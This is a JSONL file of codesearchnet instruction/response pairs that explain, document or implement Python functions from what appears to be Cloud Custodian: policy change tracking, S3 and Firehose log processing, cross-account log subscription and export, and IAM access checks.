{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef delta_commits(self, baseline, target):\n        baseline_files = self._get_policy_fents(baseline.tree)\n        target_files = self._get_policy_fents(target.tree)\n\n        baseline_policies = PolicyCollection()\n        target_policies = PolicyCollection()\n\n        # Added\n        for f in set(target_files) - set(baseline_files):\n            target_policies += self._policy_file_rev(f, target)\n\n        # Removed\n        for f in set(baseline_files) - set(target_files):\n            baseline_policies += self._policy_file_rev(f, baseline)\n\n        # Modified\n        for f in set(baseline_files).intersection(target_files):\n            if baseline_files[f].hex == target_files[f].hex:\n                continue\n            target_policies += self._policy_file_rev(f, target)\n            baseline_policies += self._policy_file_rev(f, baseline)\n\n        return CollectionDelta(\n            baseline_policies, target_policies, target, self.repo_uri).delta()", "response": "Show policies changes between arbitrary commits."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning an iterator of policy changes along a commit lineage in a repo.", "response": "def delta_stream(self, target='HEAD', limit=None,\n                     sort=pygit2.GIT_SORT_TIME | pygit2.GIT_SORT_REVERSE,\n                     after=None, before=None):\n        \"\"\"Return an iterator of policy changes along a commit lineage in a repo.\n        \"\"\"\n        if target == 'HEAD':\n            target = self.repo.head.target\n\n        commits = []\n        for commit in self.repo.walk(target, sort):\n            cdate = commit_date(commit)\n            log.debug(\n                \"processing commit id:%s date:%s parents:%d msg:%s\",\n                str(commit.id)[:6], cdate.isoformat(),\n                len(commit.parents), commit.message)\n            if after and cdate > after:\n                continue\n            if before and cdate < before:\n                continue\n            commits.append(commit)\n            if limit and len(commits) > limit:\n                break\n\n        if limit:\n            self.initialize_tree(commits[limit].tree)\n            commits.pop(-1)\n\n        for commit in commits:\n            for policy_change in self._process_stream_commit(commit):\n                yield policy_change"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _process_stream_delta(self, delta_stream):\n        for pchange in delta_stream:\n            if pchange.kind == ChangeType.ADD:\n                self.policy_files.setdefault(\n                    pchange.file_path, PolicyCollection()).add(pchange.policy)\n            elif pchange.kind == ChangeType.REMOVE:\n                self.policy_files[pchange.file_path].remove(pchange.policy)\n            elif pchange.kind in (ChangeType.MOVED, ChangeType.MODIFIED):\n                if pchange.policy.file_path != pchange.previous.file_path:\n                    self.policy_files[pchange.previous.file_path].remove(pchange.previous)\n                    if (pchange.policy.file_path in self.policy_files and\n                            pchange.policy.name in self.policy_files[pchange.file_path]):\n                        self.policy_files[pchange.file_path][pchange.policy.name] = pchange.policy\n                    else:\n                        self.policy_files.setdefault(\n                            pchange.file_path, PolicyCollection()).add(pchange.policy)\n                else:\n                    self.policy_files[pchange.file_path][pchange.policy.name] = pchange.policy\n            yield pchange", "response": "Iterates over the delta_stream and adds or removes the new entries."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef send(self, change):\n        self.buf.append(change)\n        if len(self.buf) % self.BUF_SIZE == 0:\n            self.flush()", "response": "send the given policy change"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef flush(self):\n        buf = self.buf\n        self.buf = []\n        if buf:\n            self._flush(buf)", "response": "flush any buffered messages"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef process_firehose_archive(bucket, key):\n    data = {}\n    with tempfile.NamedTemporaryFile(mode='w+b') as fh:\n        s3.download_file(bucket, key, fh.name)\n        log.warning(\"Downloaded Key Size:%s Key:%s\",\n                    sizeof_fmt(os.path.getsize(fh.name)), key)\n        fh.seek(0, 0)\n        record_count = 0\n        iteration_count = 0\n        for r in records_iter(gzip.GzipFile(fh.name, mode='r')):\n            record_count += len(r['logEvents'])\n            iteration_count += 1\n            key = '%s/%s/%s' % (r['owner'], r['logGroup'], r['logStream'])\n            data.setdefault(key, []).extend(r['logEvents'])\n            if record_count > EVENTS_SIZE_BUFFER:\n                log.warning(\n                    \"Incremental Data Load records:%d enis:%d\",\n                    record_count,\n                    len(data))\n                for k in data:\n                    process_record_set(k, data[k])\n                data.clear()\n                gc.collect()\n                record_count = 0\n\n        for k in data:\n            process_record_set(k, data[k])\n        data.clear()\n        gc.collect()", "response": "Download firehose archive and aggregate records in memory and write back."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef records_iter(fh, buffer_size=1024 * 1024 * 16):\n    buf = None\n    while True:\n        chunk = fh.read(buffer_size)\n        if not chunk:\n            if buf:\n                yield json.loads(buf)\n            return\n        if buf:\n            chunk = b\"%s%s\" % (buf, chunk)\n            buf = None\n        while chunk:\n            idx = chunk.find(b'}{')\n            if idx == -1:\n                buf = chunk\n                chunk = None\n                continue\n            record = chunk[:idx + 1]\n            yield json.loads(record)\n            chunk = chunk[idx + 1:]", "response": "Iterate over the records in a firehose s3 object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting an active session in the target account.", "response": "def get_session(self, account_id):\n        \"\"\"Get an active session in the target account.\"\"\"\n        if account_id not in self.account_sessions:\n            if account_id not in self.config['accounts']:\n                raise AccountNotFound(\"account:%s is unknown\" % account_id)\n\n            self.account_sessions[account_id] = s = assumed_session(\n                self.config['accounts'][account_id]['role'], \"Sphere11\")\n            s._session.user_agent_name = \"Sphere11\"\n            s._session.user_agent_version = \"0.07\"\n        return self.account_sessions[account_id]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nscope a schema error to its policy name and resource.", "response": "def policy_error_scope(error, data):\n    \"\"\"Scope a schema error to its policy name and resource.\"\"\"\n    err_path = list(error.absolute_path)\n    if err_path[0] != 'policies':\n        return error\n    pdata = data['policies'][err_path[1]]\n    pdata.get('name', 'unknown')\n    error.message = \"Error on policy:{} resource:{}\\n\".format(\n        pdata.get('name', 'unknown'), pdata.get('resource', 'unknown')) + error.message\n    return error"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ntries to find the best error for humans to resolve", "response": "def specific_error(error):\n    \"\"\"Try to find the best error for humans to resolve\n\n    The jsonschema.exceptions.best_match error is based purely on a\n    mix of a strong match (ie. not anyOf, oneOf) and schema depth,\n    this often yields odd results that are semantically confusing,\n    instead we can use a bit of structural knowledge of schema to\n    provide better results.\n    \"\"\"\n    if error.validator not in ('anyOf', 'oneOf'):\n        return error\n\n    r = t = None\n\n    if isinstance(error.instance, dict):\n        t = error.instance.get('type')\n        r = error.instance.get('resource')\n\n    if r is not None:\n        found = None\n        for idx, v in enumerate(error.validator_value):\n            if v['$ref'].rsplit('/', 2)[1].endswith(r):\n                found = idx\n                break\n        if found is not None:\n            # error context is a flat list of all validation\n            # failures, we have to index back to the policy\n            # of interest.\n            for e in error.context:\n                # resource policies have a fixed path from\n                # the top of the schema\n                if e.absolute_schema_path[4] == found:\n                    return specific_error(e)\n            return specific_error(error.context[idx])\n\n    if t is not None:\n        found = None\n        for idx, v in enumerate(error.validator_value):\n            if '$ref' in v and v['$ref'].rsplit('/', 2)[-1] == t:\n                found = idx\n                break\n            elif 'type' in v and t in v['properties']['type']['enum']:\n                found = idx\n                break\n\n        if found is not None:\n            for e in error.context:\n                for el in reversed(e.absolute_schema_path):\n                    if isinstance(el, int):\n                        if el == found:\n                            return e\n                        break\n    return error"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_resource_manager(self, resource_type, data=None):\n        if '.' in resource_type:\n            provider_name, resource_type = resource_type.split('.', 1)\n        else:\n            provider_name = self.ctx.policy.provider_name\n\n        provider_resources = clouds[provider_name].resources\n        klass = provider_resources.get(resource_type)\n        if klass is None:\n            raise ValueError(resource_type)\n\n        # if we're already querying via config carry it forward\n        if not data and self.source_type == 'config' and getattr(\n                klass.get_model(), 'config_type', None):\n            return klass(self.ctx, {'source': self.source_type})\n        return klass(self.ctx, data or {})", "response": "get a resource manager or a given resource type"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\naugments ElasticBeanstalk Environments with their tags.", "response": "def _eb_env_tags(envs, session_factory, retry):\n    \"\"\"Augment ElasticBeanstalk Environments with their tags.\"\"\"\n\n    client = local_session(session_factory).client('elasticbeanstalk')\n\n    def process_tags(eb_env):\n        try:\n            eb_env['Tags'] = retry(\n                client.list_tags_for_resource,\n                ResourceArn=eb_env['EnvironmentArn'])['ResourceTags']\n        except client.exceptions.ResourceNotFoundException:\n            return\n        return eb_env\n\n    # Handle API rate-limiting, which is a problem for accounts with many\n    # EB Environments\n    return list(map(process_tags, envs))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nassemble a document representing all the config state around a bucket.", "response": "def assemble_bucket(item):\n    \"\"\"Assemble a document representing all the config state around a bucket.\n\n    TODO: Refactor this, the logic here feels quite muddled.\n    \"\"\"\n    factory, b = item\n    s = factory()\n    c = s.client('s3')\n    # Bucket Location, Current Client Location, Default Location\n    b_location = c_location = location = \"us-east-1\"\n    methods = list(S3_AUGMENT_TABLE)\n    for m, k, default, select in methods:\n        try:\n            method = getattr(c, m)\n            v = method(Bucket=b['Name'])\n            v.pop('ResponseMetadata')\n            if select is not None and select in v:\n                v = v[select]\n        except (ssl.SSLError, SSLError) as e:\n            # Proxy issues? i assume\n            log.warning(\"Bucket ssl error %s: %s %s\",\n                        b['Name'], b.get('Location', 'unknown'),\n                        e)\n            continue\n        except ClientError as e:\n            code = e.response['Error']['Code']\n            if code.startswith(\"NoSuch\") or \"NotFound\" in code:\n                v = default\n            elif code == 'PermanentRedirect':\n                s = factory()\n                c = bucket_client(s, b)\n                # Requeue with the correct region given location constraint\n                methods.append((m, k, default, select))\n                continue\n            else:\n                log.warning(\n                    \"Bucket:%s unable to invoke method:%s error:%s \",\n                    b['Name'], m, e.response['Error']['Message'])\n                # For auth failures, we don't bail out, continue processing if we can.\n                # Note this can lead to missing data, but in general is cleaner than\n                # failing hard, due to the common use of locked down s3 bucket policies\n                # that may cause issues fetching information across a fleet of buckets.\n\n                # This does mean s3 policies depending on augments should check denied\n                # methods annotation, generally though lacking get access to an augment means\n                # they won't have write access either.\n\n                # For other error types we raise and bail policy execution.\n                if e.response['Error']['Code'] == 'AccessDenied':\n                    b.setdefault('c7n:DeniedMethods', []).append(m)\n                    continue\n                raise\n        # As soon as we learn location (which generally works)\n        if k == 'Location' and v is not None:\n            b_location = v.get('LocationConstraint')\n            # Location == region for all cases but EU\n            # https://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGETlocation.html\n            if b_location is None:\n                b_location = \"us-east-1\"\n            elif b_location == 'EU':\n                b_location = \"eu-west-1\"\n                v['LocationConstraint'] = 'eu-west-1'\n            if v and v != c_location:\n                c = s.client('s3', region_name=b_location)\n            elif c_location != location:\n                c = s.client('s3', region_name=location)\n        b[k] = v\n    return b"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_region(b):\n    remap = {None: 'us-east-1', 'EU': 'eu-west-1'}\n    region = b.get('Location', {}).get('LocationConstraint')\n    return remap.get(region, region)", "response": "Tries to get the region from Location. LocationConstraint EU defaults to us - east - 1"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef expand_permissions(self, permissions):\n        for p in permissions:\n            np = dict(p)\n            values = {}\n            for k in (u'IpRanges',\n                      u'Ipv6Ranges',\n                      u'PrefixListIds',\n                      u'UserIdGroupPairs'):\n                values[k] = np.pop(k, ())\n                np[k] = []\n            for k, v in values.items():\n                if not v:\n                    continue\n                for e in v:\n                    ep = dict(np)\n                    ep[k] = [e]\n                    yield ep", "response": "Expand each list of cidr prefix list user id group pair\n        by port or protocol as an individual rule."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef report(policies, start_date, options, output_fh, raw_output_fh=None):\n    regions = set([p.options.region for p in policies])\n    policy_names = set([p.name for p in policies])\n    formatter = Formatter(\n        policies[0].resource_manager.resource_type,\n        extra_fields=options.field,\n        include_default_fields=not options.no_default_fields,\n        include_region=len(regions) > 1,\n        include_policy=len(policy_names) > 1\n    )\n\n    records = []\n    for policy in policies:\n        # initialize policy execution context for output access\n        policy.ctx.initialize()\n        if policy.ctx.output.type == 's3':\n            policy_records = record_set(\n                policy.session_factory,\n                policy.ctx.output.config['netloc'],\n                policy.ctx.output.config['path'].strip('/'),\n                start_date)\n        else:\n            policy_records = fs_record_set(policy.ctx.log_dir, policy.name)\n\n        log.debug(\"Found %d records for region %s\", len(policy_records), policy.options.region)\n\n        for record in policy_records:\n            record['policy'] = policy.name\n            record['region'] = policy.options.region\n\n        records += policy_records\n\n    rows = formatter.to_csv(records)\n\n    if options.format == 'csv':\n        writer = UnicodeWriter(output_fh, formatter.headers())\n        writer.writerow(formatter.headers())\n        writer.writerows(rows)\n    elif options.format == 'json':\n        print(dumps(records, indent=2))\n    else:\n        # We special case CSV, and for other formats we pass to tabulate\n        print(tabulate(rows, formatter.headers(), tablefmt=options.format))\n\n    if raw_output_fh is not None:\n        dumps(records, raw_output_fh, indent=2)", "response": "Format a list of policies into a single report."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef record_set(session_factory, bucket, key_prefix, start_date, specify_hour=False):\n\n    s3 = local_session(session_factory).client('s3')\n\n    records = []\n    key_count = 0\n\n    date = start_date.strftime('%Y/%m/%d')\n    if specify_hour:\n        date += \"/{}\".format(start_date.hour)\n    else:\n        date += \"/00\"\n\n    marker = \"{}/{}/resources.json.gz\".format(key_prefix.strip(\"/\"), date)\n\n    p = s3.get_paginator('list_objects_v2').paginate(\n        Bucket=bucket,\n        Prefix=key_prefix.strip('/') + '/',\n        StartAfter=marker,\n    )\n\n    with ThreadPoolExecutor(max_workers=20) as w:\n        for key_set in p:\n            if 'Contents' not in key_set:\n                continue\n            keys = [k for k in key_set['Contents']\n                    if k['Key'].endswith('resources.json.gz')]\n            key_count += len(keys)\n            futures = map(lambda k: w.submit(\n                get_records, bucket, k, session_factory), keys)\n\n            for f in as_completed(futures):\n                records.extend(f.result())\n\n    log.info(\"Fetched %d records across %d files\" % (\n        len(records), key_count))\n    return records", "response": "Retrieve all s3 records for the given policy output url"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning org repo status hooks", "response": "def run(organization, hook_context, github_url, github_token,\n        verbose, metrics=False, since=None, assume=None, region=None):\n    \"\"\"scan org repo status hooks\"\"\"\n    logging.basicConfig(level=logging.DEBUG)\n\n    since = dateparser.parse(\n        since, settings={\n            'RETURN_AS_TIMEZONE_AWARE': True, 'TO_TIMEZONE': 'UTC'})\n\n    headers = {\"Authorization\": \"token {}\".format(github_token)}\n\n    response = requests.post(\n        github_url, headers=headers,\n        json={'query': query, 'variables': {'organization': organization}})\n\n    result = response.json()\n\n    if response.status_code != 200 or 'errors' in result:\n        raise Exception(\n            \"Query failed to run by returning code of {}. {}\".format(\n                response.status_code, response.content))\n\n    now = datetime.utcnow().replace(tzinfo=tzutc())\n    stats = Counter()\n    repo_metrics = RepoMetrics(\n        Bag(session_factory=SessionFactory(region, assume_role=assume)),\n        {'namespace': DEFAULT_NAMESPACE}\n    )\n\n    for r in result['data']['organization']['repositories']['nodes']:\n        commits = jmespath.search(\n            'pullRequests.edges[].node[].commits[].nodes[].commit[]', r)\n        if not commits:\n            continue\n        log.debug(\"processing repo: %s prs: %d\", r['name'], len(commits))\n        repo_metrics.dims = {\n            'Hook': hook_context,\n            'Repo': '{}/{}'.format(organization, r['name'])}\n\n        # Each commit represents a separate pr\n        for c in commits:\n            process_commit(c, r, repo_metrics, stats, since, now)\n\n    repo_metrics.dims = None\n\n    if stats['missing']:\n        repo_metrics.put_metric(\n            'RepoHookPending', stats['missing'], 'Count',\n            Hook=hook_context)\n        repo_metrics.put_metric(\n            'RepoHookLatency', stats['missing_time'], 'Seconds',\n            Hook=hook_context)\n\n    if not metrics:\n        print(dumps(repo_metrics.buf, indent=2))\n        return\n    else:\n        repo_metrics.BUF_SIZE = 20\n        repo_metrics.flush()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexpanding any variables in the action to_from or cc_from fields.", "response": "def expand_variables(self, message):\n        \"\"\"expand any variables in the action to_from/cc_from fields.\n        \"\"\"\n        p = copy.deepcopy(self.data)\n        if 'to_from' in self.data:\n            to_from = self.data['to_from'].copy()\n            to_from['url'] = to_from['url'].format(**message)\n            if 'expr' in to_from:\n                to_from['expr'] = to_from['expr'].format(**message)\n            p.setdefault('to', []).extend(ValuesFrom(to_from, self.manager).get_values())\n        if 'cc_from' in self.data:\n            cc_from = self.data['cc_from'].copy()\n            cc_from['url'] = cc_from['url'].format(**message)\n            if 'expr' in cc_from:\n                cc_from['expr'] = cc_from['expr'].format(**message)\n            p.setdefault('cc', []).extend(ValuesFrom(cc_from, self.manager).get_values())\n        return p"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef prepare_resources(self, resources):\n        handler = getattr(self, \"prepare_%s\" % (\n            self.manager.type.replace('-', '_')),\n            None)\n        if handler is None:\n            return resources\n        return handler(resources)", "response": "Prepare resources for transport.\n       ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef subscribe(config, accounts, region, merge, debug):\n    config = validate.callback(config)\n    subscription = config.get('subscription')\n\n    if subscription is None:\n        log.error(\"config file: logs subscription missing\")\n        sys.exit(1)\n\n    def converge_destination_policy(client, config):\n        destination_name = subscription['destination-arn'].rsplit(':', 1)[-1]\n        try:\n            extant_destinations = client.describe_destinations(\n                DestinationNamePrefix=destination_name).get('destinations')\n        except ClientError:\n            log.error(\"Log group destination not found: %s\",\n                      subscription['destination-arn'])\n            sys.exit(1)\n\n        account_ids = set()\n        for a in accounts:\n            if isinstance(a['role'], list):\n                account_ids.add(a['role'][-1].split(':')[4])\n            else:\n                account_ids.add(a['role'].split(':')[4])\n\n        if merge:\n            for d in extant_destinations:\n                if d['destinationName'] == destination_name:\n                    for s in json.loads(d['accessPolicy']):\n                        if s['Sid'] == 'CrossAccountDelivery':\n                            account_ids.update(s['Principal']['AWS'])\n\n        client.put_destination_policy(\n            destinationName=destination_name,\n            accessPolicy=json.dumps({\n                'Statement': [{\n                    'Action': 'logs:PutSubscriptionFilter',\n                    'Effect': 'Allow',\n                    'Principal': {'AWS': list(account_ids)},\n                    'Resource': subscription['destination-arn'],\n                    'Sid': 'CrossAccountDelivery'}]}))\n\n    def subscribe_account(t_account, subscription, region):\n        session = get_session(t_account['role'], region)\n        client = session.client('logs')\n        distribution = subscription.get('distribution', 'ByLogStream')\n\n        for g in account.get('groups'):\n            if (g.endswith('*')):\n                g = g.replace('*', '')\n                paginator = client.get_paginator('describe_log_groups')\n                allLogGroups = paginator.paginate(logGroupNamePrefix=g).build_full_result()\n                for l in allLogGroups:\n                    _process_subscribe_group(\n                        client, l['logGroupName'], subscription, distribution)\n            else:\n                _process_subscribe_group(client, g, subscription, distribution)\n\n    if subscription.get('managed-policy'):\n        if subscription.get('destination-role'):\n            session = get_session(subscription['destination-role'], region)\n        else:\n            session = boto3.Session()\n        converge_destination_policy(session.client('logs'), config)\n\n    executor = debug and MainThreadExecutor or ThreadPoolExecutor\n\n    with executor(max_workers=32) as w:\n        futures = {}\n        for account in config.get('accounts', ()):\n            if accounts and account['name'] not in accounts:\n                continue\n            futures[w.submit(subscribe_account, account, subscription, region)] = account\n\n        for f in as_completed(futures):\n            account = futures[f]\n            if f.exception():\n                log.error(\"Error on account %s err: %s\",\n                          account['name'], f.exception())\n            log.info(\"Completed %s\", account['name'])", "response": "subscribe accounts log groups to target account log group destination"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef run(config, start, end, accounts, region, debug):\n    config = validate.callback(config)\n    destination = config.get('destination')\n    start = start and parse(start) or start\n    end = end and parse(end) or datetime.now()\n    executor = debug and MainThreadExecutor or ThreadPoolExecutor\n    with executor(max_workers=32) as w:\n        futures = {}\n        for account in config.get('accounts', ()):\n            if accounts and account['name'] not in accounts:\n                continue\n            futures[\n                w.submit(process_account, account, start,\n                         end, destination, region)] = account\n        for f in as_completed(futures):\n            account = futures[f]\n            if f.exception():\n                log.error(\"Error on account %s err: %s\",\n                          account['name'], f.exception())\n            log.info(\"Completed %s\", account['name'])", "response": "run export across accounts and log groups specified in config"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef lambdafan(func):\n    if 'AWS_LAMBDA_FUNCTION_NAME' not in os.environ:\n        return func\n\n    @functools.wraps(func)\n    def scaleout(*args, **kw):\n        client = boto3.client('lambda')\n        client.invoke(\n            FunctionName=os.environ['AWS_LAMBDA_FUNCTION_NAME'],\n            InvocationType='Event',\n            Payload=dumps({\n                'event': 'fanout',\n                'function': func.__name__,\n                'args': args,\n                'kwargs': kw}),\n            Qualifier=os.environ['AWS_LAMBDA_FUNCTION_VERSION'])\n    return scaleout", "response": "simple decorator that will auto fan out async style in lambda."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef filter_group_names(groups, patterns):\n    group_names = [g['logGroupName'] for g in groups]\n    matched = set()\n    for p in patterns:\n        matched.update(fnmatch.filter(group_names, p))\n    return [g for g in groups if g['logGroupName'] in matched]", "response": "Filter log groups by shell patterns."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef filter_creation_date(groups, start, end):\n    results = []\n    for g in groups:\n        created = datetime.fromtimestamp(g['creationTime'] / 1000.0)\n        if created > end:\n            continue\n        if created > start:\n            g['exportStart'] = created\n        else:\n            g['exportStart'] = start\n        results.append(g)\n    return results", "response": "Filter log groups by their creation date."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfilters log groups where the last write was before the start date.", "response": "def filter_last_write(client, groups, start):\n    \"\"\"Filter log groups where the last write was before the start date.\n    \"\"\"\n    retry = get_retry(('ThrottlingException',))\n\n    def process_group(group_set):\n        matched = []\n        for g in group_set:\n            streams = retry(\n                client.describe_log_streams,\n                logGroupName=g['logGroupName'],\n                orderBy='LastEventTime',\n                limit=1, descending=True)\n            if not streams.get('logStreams'):\n                continue\n            stream = streams['logStreams'][0]\n            if stream['storedBytes'] == 0 and datetime.fromtimestamp(\n                    stream['creationTime'] / 1000) > start:\n                matched.append(g)\n            elif 'lastIngestionTime' in stream and datetime.fromtimestamp(\n                    stream['lastIngestionTime'] / 1000) > start:\n                matched.append(g)\n        return matched\n\n    results = []\n\n    with ThreadPoolExecutor(max_workers=3) as w:\n        futures = {}\n        for group_set in chunks(groups, 10):\n            futures[w.submit(process_group, group_set)] = group_set\n\n        for f in as_completed(futures):\n            if f.exception():\n                log.error(\n                    \"Error processing groupset:%s error:%s\",\n                    group_set,\n                    f.exception())\n            results.extend(f.result())\n\n    return results"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef filter_extant_exports(client, bucket, prefix, days, start, end=None):\n    end = end or datetime.now()\n    # days = [start + timedelta(i) for i in range((end-start).days)]\n    try:\n        tag_set = client.get_object_tagging(Bucket=bucket, Key=prefix).get('TagSet', [])\n    except ClientError as e:\n        if e.response['Error']['Code'] != 'NoSuchKey':\n            raise\n        tag_set = []\n    tags = {t['Key']: t['Value'] for t in tag_set}\n\n    if 'LastExport' not in tags:\n        return sorted(days)\n    last_export = parse(tags['LastExport'])\n    if last_export.tzinfo is None:\n        last_export = last_export.replace(tzinfo=tzutc())\n    return [d for d in sorted(days) if d > last_export]", "response": "Filter days where the bucket already has extant export keys."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef access(config, region, accounts=()):\n    config = validate.callback(config)\n    accounts_report = []\n\n    def check_access(account):\n        accounts_report.append(account)\n        session = get_session(account['role'], region)\n        identity = session.client('sts').get_caller_identity()\n        account['account_id'] = identity['Account']\n        account.pop('groups')\n        account.pop('role')\n        client = session.client('iam')\n        policy_arn = identity['Arn']\n        if policy_arn.count('/') > 1:\n            policy_arn = policy_arn.rsplit('/', 1)[0]\n        if ':sts:' in policy_arn:\n            policy_arn = policy_arn.replace(':sts', ':iam')\n        if ':assumed-role' in policy_arn:\n            policy_arn = policy_arn.replace(':assumed-role', ':role')\n        evaluation = client.simulate_principal_policy(\n            PolicySourceArn=policy_arn,\n            ActionNames=['logs:CreateExportTask'])['EvaluationResults']\n        account['access'] = evaluation[0]['EvalDecision']\n\n    with ThreadPoolExecutor(max_workers=16) as w:\n        futures = {}\n        for account in config.get('accounts', ()):\n            if accounts and account['name'] not in accounts:\n                continue\n            futures[w.submit(check_access, account)] = None\n        for f in as_completed(futures):\n            pass\n    accounts_report.sort(key=operator.itemgetter('access'), reverse=True)\n    print(tabulate(accounts_report, headers='keys'))", "response": "Check iam permissions for log export access in each account"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef size(config, accounts=(), day=None, group=None, human=True, region=None):\n    config = validate.callback(config)\n    destination = config.get('destination')\n    client = boto3.Session().client('s3')\n    day = parse(day)\n\n    def export_size(client, account):\n        paginator = client.get_paginator('list_objects_v2')\n        count = 0\n        size = 0\n        session = get_session(account['role'], region)\n        account_id = session.client('sts').get_caller_identity()['Account']\n        prefix = destination.get('prefix', '').rstrip('/') + '/%s' % account_id\n        prefix = \"%s/%s/%s\" % (prefix, group, day.strftime(\"%Y/%m/%d\"))\n        account['account_id'] = account_id\n        for page in paginator.paginate(\n                Bucket=destination['bucket'],\n                Prefix=prefix):\n            for k in page.get('Contents', ()):\n                size += k['Size']\n                count += 1\n        return (count, size)\n\n    total_size = 0\n    accounts_report = []\n    logging.getLogger('botocore').setLevel(logging.ERROR)\n    with ThreadPoolExecutor(max_workers=16) as w:\n        futures = {}\n        for account in config.get('accounts'):\n            if accounts and account['name'] not in accounts:\n                continue\n            futures[w.submit(export_size, client, account)] = account\n\n        for f in as_completed(futures):\n            account = futures[f]\n            count, size = f.result()\n            account.pop('role')\n            account.pop('groups')\n            total_size += size\n            if human:\n                account['size'] = GetHumanSize(size)\n            else:\n                account['size'] = size\n            account['count'] = count\n            accounts_report.append(account)\n\n    accounts_report.sort(key=operator.itemgetter('count'), reverse=True)\n    print(tabulate(accounts_report, headers='keys'))\n    log.info(\"total size:%s\", GetHumanSize(total_size))", "response": "Returns a list of exported records for a given day."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sync(config, group, accounts=(), dryrun=False, region=None):\n    config = validate.callback(config)\n    destination = config.get('destination')\n    client = boto3.Session().client('s3')\n\n    for account in config.get('accounts', ()):\n        if accounts and account['name'] not in accounts:\n            continue\n\n        session = get_session(account['role'], region)\n        account_id = session.client('sts').get_caller_identity()['Account']\n        prefix = destination.get('prefix', '').rstrip('/') + '/%s' % account_id\n        prefix = \"%s/%s\" % (prefix, group)\n\n        exports = get_exports(client, destination['bucket'], prefix + \"/\")\n\n        role = account.pop('role')\n        if isinstance(role, six.string_types):\n            account['account_id'] = role.split(':')[4]\n        else:\n            account['account_id'] = role[-1].split(':')[4]\n        account.pop('groups')\n\n        if exports:\n            last_export = exports.pop()\n            account['export'] = last_export\n        else:\n            account['export'] = 'missing'\n            last_export = None\n        try:\n            tag_set = client.get_object_tagging(\n                Bucket=destination['bucket'], Key=prefix).get('TagSet', [])\n        except ClientError:\n            tag_set = []\n\n        tags = {t['Key']: t['Value'] for t in tag_set}\n        tagged_last_export = None\n\n        if 'LastExport' in tags:\n            le = parse(tags['LastExport'])\n            tagged_last_export = (le.year, le.month, le.day)\n            account['sync'] = tagged_last_export\n        else:\n            account['sync'] = account['export'] != 'missing' and 'sync' or 'missing'\n\n        if last_export is None:\n            continue\n\n        if tagged_last_export == last_export or account['export'] == 'missing':\n            continue\n\n        if dryrun:\n            continue\n\n        client.put_object(\n            Bucket=destination['bucket'],\n            Key=prefix,\n            Body=json.dumps({}),\n            ACL=\"bucket-owner-full-control\",\n            ServerSideEncryption=\"AES256\")\n\n        export_time = datetime.now().replace(tzinfo=tzlocal()).astimezone(tzutc())\n        export_time = export_time.replace(\n            year=last_export[0], month=last_export[1], day=last_export[2],\n            minute=0, second=0, microsecond=0, hour=0)\n        client.put_object_tagging(\n            Bucket=destination['bucket'], Key=prefix,\n            Tagging={\n                'TagSet': [{\n                    'Key': 'LastExport',\n                    'Value': export_time.isoformat()}]})\n\n    accounts_report = []\n    for a in config.get('accounts'):\n        if accounts and a['name'] not in accounts:\n            continue\n        if isinstance(a['sync'], tuple):\n            a['sync'] = \"%s/%s/%s\" % (a['sync'])\n        if isinstance(a['export'], tuple):\n            a['export'] = \"%s/%s/%s\" % (a['export'])\n        accounts_report.append(a)\n\n    accounts_report.sort(key=operator.itemgetter('export'), reverse=True)\n    print(tabulate(accounts_report, headers='keys'))", "response": "Sync the last recorded export to actual"}
